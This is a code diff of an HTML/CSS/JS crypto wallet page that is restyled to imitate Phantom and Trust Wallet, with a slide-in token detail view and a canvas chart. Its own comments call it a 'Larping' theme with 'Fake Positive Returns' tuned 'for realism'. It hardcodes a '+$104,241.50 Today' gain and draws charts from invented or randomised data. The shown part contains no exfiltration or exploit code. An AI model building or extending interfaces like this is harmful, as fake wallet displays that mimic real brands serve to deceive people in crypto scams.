@@ -10,115 +10,112 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            /* Ultra Premium Larping Dark Theme */
+            /* Ultra Premium iOS Dark Theme (Phantom/Trust Match) */
             --bg-deep: #000000;
-            --bg-panel: #050505;
-            --bg-card: #111111;
+            --bg-panel: #101010;
+            --bg-card: #1c1c1e;
             --text-main: #ffffff;
-            --text-muted: #888888;
-            --neon-green: #00ffa3; 
-            --neon-glow: rgba(0, 255, 163, 0.4);
-            --danger: #ff3e3e;
+            --text-muted: #8e8e93;
+            --neon-green: #14F195; /* Phantom specific green */
+            --danger: #ff3b30;
         }
         body { background-color: var(--bg-deep); color: var(--text-main); font-family: 'Inter', sans-serif; margin: 0; user-select: none; -webkit-tap-highlight-color: transparent; overflow-x: hidden; }
-        .app-wrapper { max-width: 440px; margin: 0 auto; min-height: 100vh; background-color: var(--bg-panel); position: relative; padding-bottom: 90px; box-shadow: 0 0 100px rgba(0,255,163,0.05); }
+        
+        .app-wrapper { max-width: 440px; margin: 0 auto; min-height: 100vh; background-color: var(--bg-deep); position: relative; padding-bottom: 90px; }
         ::-webkit-scrollbar { display: none; }
 
-        /* VVIP Hero Section with Glowing Aura */
         .hero-bg { 
-            background: radial-gradient(circle at 50% 0%, rgba(0, 255, 163, 0.12) 0%, transparent 70%); 
+            background: linear-gradient(180deg, rgba(20,241,149,0.05) 0%, rgba(0,0,0,0) 100%);
             padding: 24px 20px 0px; 
-            border-bottom: 1px solid rgba(255,255,255,0.05);
         }
 
-        /* REFINED: Realistic Balance Font (Thinner, cleaner) */
         .main-balance-text { 
-            font-size: 50px; 
-            font-weight: 700; /* Regularized font weight from 900 for realism */
-            letter-spacing: -2px; 
+            font-size: 48px; 
+            font-weight: 700; 
+            letter-spacing: -1.5px; 
             color: #ffffff; 
             display: flex; align-items: center; justify-content: center; 
             margin: 0; padding: 0;
-            text-shadow: 0 0 15px rgba(255,255,255,0.1); /* Reduced excessive shadow */
         }
         .main-balance-text span { font-variant-numeric: tabular-nums; }
         
-        /* Fake Positive Returns */
         .balance-change { 
-            color: var(--neon-green); font-size: 15px; font-weight: 700; 
-            margin-top: 2px; display: flex; justify-content: center; 
-            align-items: center; gap: 4px; text-shadow: 0 0 15px var(--neon-glow);
+            color: var(--neon-green); font-size: 15px; font-weight: 600; 
+            margin-top: 4px; display: flex; justify-content: center; 
+            align-items: center; gap: 4px;
         }
 
         .status-badge { 
             display: inline-flex; align-items: center; gap: 6px; 
-            background: rgba(255,255,255,0.08); padding: 8px 14px; 
-            border-radius: 40px; font-size: 13px; font-weight: 700; 
-            color: #fff; cursor: pointer; border: 1px solid rgba(255,255,255,0.05); 
-            backdrop-filter: blur(10px); transition: 0.2s;
+            background: rgba(255,255,255,0.1); padding: 8px 14px; 
+            border-radius: 40px; font-size: 13px; font-weight: 600; 
+            color: #fff; cursor: pointer; transition: 0.2s;
         }
-        .status-badge:hover { background: rgba(255,255,255,0.12); }
+        .status-badge:hover { background: rgba(255,255,255,0.15); }
         .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--danger); box-shadow: 0 0 10px var(--danger); }
-        .dot.connected { background: var(--neon-green); box-shadow: 0 0 15px var(--neon-green); }
+        .dot.connected { background: var(--neon-green); box-shadow: 0 0 12px var(--neon-green); }
 
-        /* UPGRADED: Professional Area Chart */
-        .graph-wrapper { position: relative; width: 100%; height: 180px; margin-top: 15px; overflow: hidden; cursor: crosshair; }
-        #portfolioChart { width: 100%; height: 100%; display: block; }
+        /* Responsive Graph Area */
+        .graph-wrapper { position: relative; width: 100%; height: 160px; margin-top: 20px; overflow: hidden; cursor: crosshair; }
+        canvas { width: 100%; height: 100%; display: block; }
         .chart-overlay { 
             position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-            pointer-events: none; background: linear-gradient(to top, var(--bg-panel) 0%, transparent 100%); 
+            pointer-events: none; background: linear-gradient(to top, var(--bg-deep) 0%, transparent 100%); 
         }
 
-        /* Timeframe row */
         .tf-row { display: flex; justify-content: center; gap: 20px; padding: 10px 0; margin-bottom: 10px; }
-        .tf-item { font-size: 12px; font-weight: 800; color: var(--text-muted); cursor: pointer; transition: 0.2s; }
-        .tf-item.active { color: #fff; border-bottom: 2px solid #fff; padding-bottom: 2px; }
+        .tf-item { font-size: 13px; font-weight: 600; color: var(--text-muted); cursor: pointer; transition: 0.2s; padding: 4px 8px; border-radius: 8px;}
+        .tf-item.active { color: #000; background-color: rgba(255,255,255,0.9); }
 
-        /* UPGRADED: Glassmorphism Liquid Buttons */
-        .action-row { display: flex; justify-content: space-around; padding: 0 15px; margin-top: 20px; margin-bottom: 20px; }
-        .btn-action-container { display: flex; flex-direction: column; align-items: center; gap: 10px; flex: 1; }
+        .action-row { display: flex; justify-content: space-around; padding: 0 15px; margin-top: 15px; margin-bottom: 25px; }
+        .btn-action-container { display: flex; flex-direction: column; align-items: center; gap: 8px; flex: 1; }
         .btn-action { 
-            width: 52px; height: 52px; border-radius: 50%; 
-            background: rgba(255,255,255,0.05); /* Frosted glass look */
-            backdrop-filter: blur(10px);
-            color: var(--text-main); display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
-            border: 1px solid rgba(255,255,255,0.08);
-            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            width: 56px; height: 56px; border-radius: 50%; 
+            background: rgba(255,255,255,0.08); 
+            color: var(--text-main); display: flex; align-items: center; 
+            justify-content: center; cursor: pointer; transition: all 0.2s ease; 
         }
-        .btn-action:hover { border-color: var(--neon-green); box-shadow: 0 0 20px rgba(0, 255, 163, 0.2); transform: translateY(-2px); }
-        .btn-action:active { transform: scale(0.92); }
-        .btn-action.primary { background: #ffffff; color: #000; border: none; }
-        .action-label { font-size: 13px; font-weight: 700; color: #fff; opacity: 0.9; }
+        .btn-action:active { transform: scale(0.92); background: rgba(255,255,255,0.15); }
+        .action-label { font-size: 13px; font-weight: 500; color: #fff; opacity: 0.9; }
 
-        /* Tabs */
-        .tab-bar { display: flex; border-bottom: 1px solid rgba(255,255,255,0.05); padding: 0 15px; }
-        .tab { flex: 1; text-align: center; padding: 16px 0; font-size: 16px; font-weight: 800; color: var(--text-muted); cursor: pointer; transition: 0.2s; }
-        .tab.active { color: #fff; position: relative; }
-        .tab.active::after { content: ''; position: absolute; bottom: -1px; left: 25%; width: 50%; height: 3px; background: #fff; border-radius: 10px 10px 0 0; }
+        .tab-bar { display: flex; border-bottom: 1px solid rgba(255,255,255,0.1); padding: 0 15px; }
+        .tab { flex: 1; text-align: center; padding: 14px 0; font-size: 15px; font-weight: 600; color: var(--text-muted); cursor: pointer; transition: 0.2s; }
+        .tab.active { color: #fff; border-bottom: 2px solid #fff; }
 
-        /* Views & Assets */
         .view-section { display: none; animation: fadeIn 0.3s; }
         .view-section.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        .asset-row { display: flex; align-items: center; padding: 16px 20px; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.02); transition: 0.2s; }
-        .asset-row:hover { background: rgba(255,255,255,0.03); }
-        .asset-icon { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; border: 1px solid rgba(255,255,255,0.1); }
+        /* Asset Rows (Clickable like video) */
+        .asset-row { display: flex; align-items: center; padding: 16px 20px; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.05); transition: background 0.2s; }
+        .asset-row:active { background: rgba(255,255,255,0.1); }
+        .asset-icon { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; }
         
         /* Modals */
-        .modal-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(15px); display: none; justify-content: center; align-items: flex-end; z-index: 1000; }
-        .modal-pane { background: var(--bg-card); width: 100%; max-width: 440px; border-radius: 30px 30px 0 0; padding: 30px 24px 50px; border-top: 1px solid rgba(255,255,255,0.1); box-shadow: 0 -20px 40px rgba(0,0,0,0.5); }
+        .modal-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); display: none; justify-content: center; align-items: flex-end; z-index: 1000; }
+        .modal-pane { background: var(--bg-card); width: 100%; max-width: 440px; border-radius: 20px 20px 0 0; padding: 24px; box-shadow: 0 -10px 40px rgba(0,0,0,0.5); }
         
-        .input-dark { background: var(--bg-deep); color: white; width: 100%; padding: 20px; border-radius: 18px; font-size: 16px; outline: none; border: 1px solid rgba(255,255,255,0.05); margin-bottom: 15px; font-family: 'Inter'; transition: 0.2s; }
-        .input-dark:focus { border-color: var(--neon-green); box-shadow: 0 0 15px rgba(0,255,163,0.1); }
+        .input-dark { background: var(--bg-panel); color: white; width: 100%; padding: 16px; border-radius: 12px; font-size: 16px; outline: none; border: 1px solid rgba(255,255,255,0.1); margin-bottom: 15px; transition: 0.2s; }
+        .input-dark:focus { border-color: var(--neon-green); }
         
-        /* Toast */
-        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: rgba(255,255,255,0.95); color: #000; padding: 14px 28px; border-radius: 40px; font-size: 14px; font-weight: 800; box-shadow: 0 15px 30px rgba(0,0,0,0.3); transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 2000; }
-        #toast.show { top: 30px; }
+        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: #fff; color: #000; padding: 14px 24px; border-radius: 30px; font-size: 14px; font-weight: 600; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 2000; }
+        #toast.show { top: 40px; }
 
-        /* Sync blink */
         .sync-blink { animation: syncPulse 2s infinite; }
         @keyframes syncPulse { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
+
+        /* =========================================================
+           NEW: TOKEN DETAIL SLIDE-IN PAGE (LIKE VIDEO)
+           ========================================================= */
+        .slide-in-view {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-deep); z-index: 500;
+            transform: translateX(100%); transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow-y: auto; padding-bottom: 50px;
+        }
+        .slide-in-view.active { transform: translateX(0); }
+        .nav-header { display: flex; align-items: center; justify-content: space-between; padding: 20px; border-bottom: 1px solid rgba(255,255,255,0.05); position: sticky; top: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); z-index: 10;}
+        .back-btn { display: flex; align-items: center; gap: 8px; font-size: 16px; font-weight: 500; color: var(--neon-green); cursor: pointer;}
     </style>
 </head>
 <body>
@@ -126,38 +123,147 @@
     <div class="app-wrapper">
         <div id="toast">Message</div>
 
-        <div class="hero-bg">
-            <div class="flex justify-between items-center mb-6">
-                <div class="flex items-center gap-2">
-                    <svg viewBox="0 0 24 24" class="w-6 h-6 text-white" fill="none" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 002-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"></path></svg>
-                    <span class="font-extrabold text-[19px] tracking-tight">Main Wallet</span>
+        <div id="mainView">
+            <div class="hero-bg">
+                <div class="flex justify-between items-center mb-6">
+                    <div class="flex items-center gap-2">
+                        <span class="font-bold text-[20px] tracking-tight">Main Wallet 1</span>
+                        <svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+                    
+                    <div class="status-badge" onclick="handleSmartConnect()" id="connectBtn">
+                        <div class="dot" id="statusDot"></div>
+                        <span id="btnText">Connect</span>
+                    </div>
                 </div>
-                
-                <div class="status-badge" onclick="handleSmartConnect()" id="connectBtn">
-                    <div class="dot" id="statusDot"></div>
-                    <span id="btnText">Connect</span>
+
+                <div id="syncIndicator" class="hidden justify-center items-center gap-1.5 sync-blink mb-4">
+                    <div class="w-1.5 h-1.5 rounded-full bg-[var(--neon-green)]"></div>
+                    <span class="text-[10px] font-bold text-[var(--neon-green)] tracking-widest uppercase">Live Sync</span>
+                </div>
+
+                <div class="flex flex-col items-center relative z-10 mt-4">
+                    <h1 class="main-balance-text">$<span id="mainVal">0.00</span></h1>
+                    <div class="balance-change">
+                        +$104,241.50 (3.82%) Today
+                    </div>
+                </div>
+
+                <div class="graph-wrapper" id="mainGraphContainer">
+                    <canvas id="portfolioChart"></canvas>
+                    <div class="chart-overlay"></div>
+                </div>
+
+                <div class="tf-row">
+                    <span class="tf-item">1H</span>
+                    <span class="tf-item">1D</span>
+                    <span class="tf-item active">1W</span>
+                    <span class="tf-item">1M</span>
+                    <span class="tf-item">1Y</span>
+                    <span class="tf-item">ALL</span>
+                </div>
+
+                <div class="action-row">
+                    <div class="btn-action-container">
+                        <div class="btn-action" onclick="showToast('Initializing Fiat Gateway...')">
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
+                        </div>
+                        <span class="action-label">Buy</span>
+                    </div>
+                    <div class="btn-action-container">
+                        <div class="btn-action" onclick="showToast('Routing swap...')">
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path></svg>
+                        </div>
+                        <span class="action-label">Swap</span>
+                    </div>
+                    <div class="btn-action-container">
+                        <div class="btn-action" onclick="openSendModal()">
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path></svg>
+                        </div>
+                        <span class="action-label">Send</span>
+                    </div>
+                    <div class="btn-action-container">
+                        <div class="btn-action" onclick="showToast('Copy Address: ' + (userAccount ? userAccount.substring(0,6)+'...' : 'Not Connected'))">
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
+                        </div>
+                        <span class="action-label">Receive</span>
+                    </div>
                 </div>
             </div>
 
-            <div id="syncIndicator" class="hidden justify-center items-center gap-1.5 sync-blink mb-4">
-                <div class="w-1.5 h-1.5 rounded-full bg-[var(--neon-green)]"></div>
-                <span class="text-[10px] font-bold text-[var(--neon-green)] tracking-widest uppercase">Live Sync</span>
+            <div class="tab-bar">
+                <div class="tab active" onclick="switchTab('assetsTab', this)">Tokens</div>
+                <div class="tab" onclick="switchTab('historyTab', this)">NFTs</div>
             </div>
 
-            <div class="flex flex-col items-center relative z-10">
-                <h1 class="main-balance-text">$<span id="mainVal">0.00</span></h1>
-                <div class="balance-change">
-                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M12 7a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0V8.414l-4.293 4.293a1 1 0 01-1.414 0L8 10.414l-4.293 4.293a1 1 0 01-1.414-1.414l5-5a1 1 0 011.414 0L11 10.586 14.586 7H12z" clip-rule="evenodd"></path></svg>
-                    +3.82% (+$104,241.50)
+            <div id="assetsTab" class="view-section active pt-2 pb-10">
+                <div id="assetContainer">
+                    <div class="asset-row" onclick="openTokenDetail('BNB', 'BNB', document.getElementById('rowBnbBal').innerText, document.getElementById('rowBnbUsd').innerText, 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png')">
+                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png" class="asset-icon mr-4" alt="BNB">
+                        <div class="flex-1">
+                            <h4 class="font-bold text-[17px]">BNB</h4>
+                            <p id="bnbLivePrice" class="text-[14px] text-[var(--text-muted)] font-medium mt-0.5">$0.00</p>
+                        </div>
+                        <div class="text-right">
+                            <h4 id="rowBnbBal" class="font-bold text-[17px] tabular-nums">0.00</h4>
+                            <p id="rowBnbUsd" class="text-[14px] text-[var(--text-muted)] font-medium tabular-nums mt-0.5">$0.00</p>
+                        </div>
+                    </div>
+
+                    <div class="asset-row" onclick="openTokenDetail('USDT', 'Tether USD', document.getElementById('rowUsdtBal').innerText, '$'+document.getElementById('rowUsdtVal').innerText, 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png')">
+                        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="asset-icon mr-4" alt="USDT">
+                        <div class="flex-1">
+                            <h4 class="font-bold text-[17px]">USDT</h4>
+                            <p class="text-[14px] text-[var(--text-muted)] font-medium mt-0.5">Tether USD</p>
+                        </div>
+                        <div class="text-right">
+                            <h4 id="rowUsdtBal" class="font-bold text-[17px] tabular-nums text-white">0.00</h4>
+                            <p class="text-[14px] text-[var(--text-muted)] font-medium tabular-nums mt-0.5">$<span id="rowUsdtVal">0.00</span></p>
+                        </div>
+                    </div>
+                    
+                    <div id="marketTokens"></div>
+
+                    <div class="text-center py-8 pb-24 relative z-50">
+                        <button onclick="injectTokenManual()" class="bg-transparent text-[var(--neon-green)] px-6 py-3 rounded-full text-[15px] font-bold transition-all active:opacity-50">
+                            <span id="importBtnText">+ Import Tokens</span>
+                        </button>
+                    </div>
                 </div>
             </div>
 
-            <div class="graph-wrapper" id="graphContainer">
-                <canvas id="portfolioChart"></canvas>
-                <div class="chart-overlay"></div>
+            <div id="historyTab" class="view-section">
+                <div id="historyContainer" class="pt-4">
+                    <div class="text-center pt-10 text-[var(--text-muted)] text-[14px]" id="emptyHistory">
+                        No NFTs found.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="tokenDetailView" class="slide-in-view max-w-[440px] mx-auto">
+            <div class="nav-header">
+                <div class="back-btn" onclick="closeTokenDetail()">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
+                    Back
+                </div>
+                <div class="font-bold text-[17px]" id="detailHeaderName">Token</div>
+                <div class="w-6"></div> </div>
+
+            <div class="flex flex-col items-center mt-6">
+                <img id="detailTokenIcon" src="" class="w-16 h-16 rounded-full border border-gray-800 mb-4">
+                <h2 class="text-[36px] font-bold tracking-tight" id="detailTokenUsd">$0.00</h2>
+                <p class="text-[16px] text-[var(--text-muted)] font-medium mt-1" id="detailTokenBalance">0.00</p>
+                <div class="balance-change mt-2 text-[14px]">
+                    +$42.50 (1.2%) Today
+                </div>
             </div>
 
-            <div class="tf-row">
+            <div class="graph-wrapper" id="detailGraphContainer" style="height: 140px;">
+                <canvas id="detailChart"></canvas>
+            </div>
+
+            <div class="tf-row mt-4">
                 <span class="tf-item">1D</span>
                 <span class="tf-item active">1W</span>
                 <span class="tf-item">1M</span>
@@ -165,79 +271,27 @@
                 <span class="tf-item">ALL</span>
             </div>
 
-            <div class="action-row">
+            <div class="action-row mt-8">
                 <div class="btn-action-container">
-                    <div class="btn-action" onclick="showToast('Initializing Fiat Gateway...')">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path></svg>
-                    </div>
-                    <span class="action-label">Buy</span>
-                </div>
-                <div class="btn-action-container">
-                    <div class="btn-action" onclick="showToast('Routing swap...')">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path></svg>
-                    </div>
-                    <span class="action-label">Swap</span>
-                </div>
-                <div class="btn-action-container">
-                    <div class="btn-action primary" onclick="openSendModal()">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 10l7-7m0 0l7 7m-7-7v18"></path></svg>
+                    <div class="btn-action" style="background: var(--neon-green); color: black;" onclick="openSendModal()">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path></svg>
                     </div>
                     <span class="action-label">Send</span>
                 </div>
                 <div class="btn-action-container">
-                    <div class="btn-action" onclick="showToast('Copy Address: ' + (userAccount ? userAccount.substring(0,6)+'...' : 'Not Connected'))">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
+                    <div class="btn-action" onclick="showToast('Copy Address')">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
                     </div>
                     <span class="action-label">Receive</span>
                 </div>
             </div>
-        </div>
 
-        <div class="tab-bar">
-            <div class="tab active" onclick="switchTab('assetsTab', this)">Assets</div>
-            <div class="tab" onclick="switchTab('historyTab', this)">Accounts</div>
-        </div>
-
-        <div id="assetsTab" class="view-section active pt-2 pb-10">
-            <div id="assetContainer">
-                <div class="asset-row">
-                    <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png" class="asset-icon mr-4" alt="BNB">
-                    <div class="flex-1">
-                        <h4 class="font-bold text-[16px]">BNB</h4>
-                        <p id="bnbLivePrice" class="text-[13px] text-[var(--text-muted)] font-medium mt-0.5">$0.00</p>
+            <div class="px-5 mt-8">
+                <h3 class="font-bold text-[18px] mb-4">Activity</h3>
+                <div id="detailHistoryContainer">
+                    <div class="text-center text-[var(--text-muted)] text-[14px] mt-6">
+                        No recent activity for this token.
                     </div>
-                    <div class="text-right">
-                        <h4 id="rowBnbBal" class="font-bold text-[16px] tabular-nums">0.00</h4>
-                        <p id="rowBnbUsd" class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums mt-0.5">$0.00</p>
-                    </div>
-                </div>
-
-                <div class="asset-row">
-                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="asset-icon mr-4" alt="USDT">
-                    <div class="flex-1">
-                        <h4 class="font-bold text-[16px]">USDT</h4>
-                        <p class="text-[13px] text-[var(--text-muted)] font-medium mt-0.5">Tether USD</p>
-                    </div>
-                    <div class="text-right">
-                        <h4 id="rowUsdtBal" class="font-bold text-[16px] tabular-nums text-white">0.00</h4>
-                        <p class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums mt-0.5">$<span id="rowUsdtVal">0.00</span></p>
-                    </div>
-                </div>
-                
-                <div id="marketTokens"></div>
-
-                <div class="text-center py-10 pb-24 relative z-50">
-                    <button onclick="injectTokenManual()" class="bg-[rgba(38,161,123,0.1)] text-[var(--neon-green)] border border-[var(--neon-green)] border-opacity-30 px-6 py-3 rounded-full text-[13px] font-extrabold uppercase tracking-wide cursor-pointer hover:bg-[var(--neon-green)] hover:text-black transition-all active:scale-95 shadow-[0_0_15px_rgba(38,161,123,0.15)]">
-                        <span id="importBtnText">+ Import Custom Token</span>
-                    </button>
-                </div>
-            </div>
-        </div>
-
-        <div id="historyTab" class="view-section">
-            <div id="historyContainer" class="pt-2">
-                <div class="text-center pt-10 text-[var(--text-muted)] text-[13px] font-medium" id="emptyHistory">
-                    No transactions yet.
                 </div>
             </div>
         </div>
@@ -246,122 +300,136 @@
 
     <div class="modal-bg" id="sendModal" onclick="if(event.target==this) closeSendModal()">
         <div class="modal-pane">
-            <div class="flex justify-between items-center mb-8">
-                <h3 class="font-black text-[22px]">Send USDT</h3>
-                <svg onclick="closeSendModal()" class="w-7 h-7 text-[var(--text-muted)] cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+            <div class="flex justify-between items-center mb-6">
+                <h3 class="font-bold text-[20px]">Send Token</h3>
+                <svg onclick="closeSendModal()" class="w-6 h-6 text-[var(--text-muted)] cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
             </div>
             <div class="space-y-4 mb-6">
                 <input type="text" id="txTo" class="input-dark" placeholder="Recipient Address (0x...)" autocomplete="off">
-                <input type="number" id="txAmt" class="input-dark tabular-nums" placeholder="Amount (USDT)" autocomplete="off">
+                <input type="number" id="txAmt" class="input-dark tabular-nums" placeholder="Amount" autocomplete="off">
             </div>
-            <button onclick="executeTransfer()" id="execBtn" class="w-full bg-[var(--text-main)] text-black font-extrabold py-5 rounded-2xl text-[17px] active:scale-95 transition-transform">
+            <button onclick="executeTransfer()" id="execBtn" class="w-full bg-[var(--neon-green)] text-black font-bold py-4 rounded-xl text-[16px] active:scale-95 transition-transform">
                 Next
             </button>
         </div>
     </div>
 
     <script>
-        // --- NEW: SMOOTH BEZIER NEON CHART ENGINE ---
-        function initInteractiveChart() {
-            const canvas = document.getElementById('portfolioChart');
-            const ctx = canvas.getContext('2d');
-            const container = document.getElementById('graphContainer');
+        // --- UI NAVIGATION FUNCTIONS ---
+        function openTokenDetail(symbol, name, balanceStr, usdStr, iconUrl) {
+            document.getElementById('tokenDetailView').classList.add('active');
+            document.getElementById('detailHeaderName').innerText = name;
+            document.getElementById('detailTokenUsd').innerText = usdStr;
+            document.getElementById('detailTokenBalance').innerText = balanceStr + " " + symbol;
+            document.getElementById('detailTokenIcon').src = iconUrl;
             
+            // Re-render chart for the detail view
+            setTimeout(() => {
+                initInteractiveChart('detailChart', 'detailGraphContainer');
+            }, 300);
+        }
+
+        function closeTokenDetail() {
+            document.getElementById('tokenDetailView').classList.remove('active');
+        }
+
+        // --- NEW REUSABLE BEZIER GRAPH ENGINE (Phantom Style) ---
+        function initInteractiveChart(canvasId = 'portfolioChart', containerId = 'mainGraphContainer') {
+            const canvas = document.getElementById(canvasId);
+            const container = document.getElementById(containerId);
+            if(!canvas || !container) return;
+
+            const ctx = canvas.getContext('2d');
             const dpr = window.devicePixelRatio || 1;
             canvas.width = container.clientWidth * dpr;
             canvas.height = container.clientHeight * dpr;
             ctx.scale(dpr, dpr);
 
-            // UPGRADED Points: More professional trend line
-            const points = [80, 85, 75, 110, 90, 120, 100, 140, 130, 155, 145, 170, 160, 190, 185];
+            // Randomize points slightly so each chart looks a bit different
+            const basePoints = [80, 82, 78, 85, 83, 95, 90, 105, 102, 115, 108, 120, 115, 135, 130];
+            const points = canvasId === 'detailChart' ? basePoints.map(p => p + (Math.random() * 20 - 10)) : basePoints;
             let mouseX = -1;
 
             container.addEventListener('mousemove', (e) => { mouseX = e.offsetX; draw(); });
             container.addEventListener('mouseleave', () => { mouseX = -1; draw(); });
+            container.addEventListener('touchmove', (e) => {
+                const rect = container.getBoundingClientRect();
+                mouseX = e.touches[0].clientX - rect.left;
+                draw();
+            }, {passive: true});
+            container.addEventListener('touchend', () => { mouseX = -1; draw(); });
 
             function draw() {
                 ctx.clearRect(0, 0, canvas.width, canvas.height);
-                const margin = 10;
-                const w = container.clientWidth - (margin * 2);
-                const h = container.clientHeight - (margin * 2);
+                const w = container.clientWidth;
+                const h = container.clientHeight;
                 const step = w / (points.length - 1);
 
-                // Normalizing points to fit chart height (assuming max is 200)
-                const chartPoints = points.map(p => margin + (h - (p / 200) * h));
+                const coords = points.map((p, i) => ({
+                    x: i * step,
+                    y: h - (p / 160) * h + 20 
+                }));
 
-                // Draw Gradient Area (Pro Feature)
+                // Gradient Fill
+                const gradient = ctx.createLinearGradient(0, 0, 0, h);
+                gradient.addColorStop(0, 'rgba(20, 241, 149, 0.2)'); // Phantom Green alpha
+                gradient.addColorStop(1, 'rgba(20, 241, 149, 0.0)');
+
                 ctx.beginPath();
-                ctx.moveTo(margin, container.clientHeight);
+                ctx.moveTo(coords[0].x, h);
+                ctx.lineTo(coords[0].x, coords[0].y);
                 
-                // Drawing smooth curves
-                ctx.lineTo(margin, chartPoints[0]);
-                for(let i=0; i<points.length-1; i++){
-                    const x1 = margin + (i * step);
-                    const y1 = chartPoints[i];
-                    const x2 = margin + ((i+1) * step);
-                    const y2 = chartPoints[i+1];
-                    const cx = (x1 + x2) / 2;
-                    ctx.quadraticCurveTo(x1, y1, cx, (y1+y2)/2);
-                    ctx.lineTo(x2,y2);
+                for (let i = 0; i < coords.length - 1; i++) {
+                    const xc = (coords[i].x + coords[i + 1].x) / 2;
+                    const yc = (coords[i].y + coords[i + 1].y) / 2;
+                    ctx.quadraticCurveTo(coords[i].x, coords[i].y, xc, yc);
                 }
-                ctx.lineTo(margin + w, container.clientHeight);
-                ctx.closePath();
-                
-                const areaGradient = ctx.createLinearGradient(0, chartPoints[chartPoints.length-1], 0, container.clientHeight);
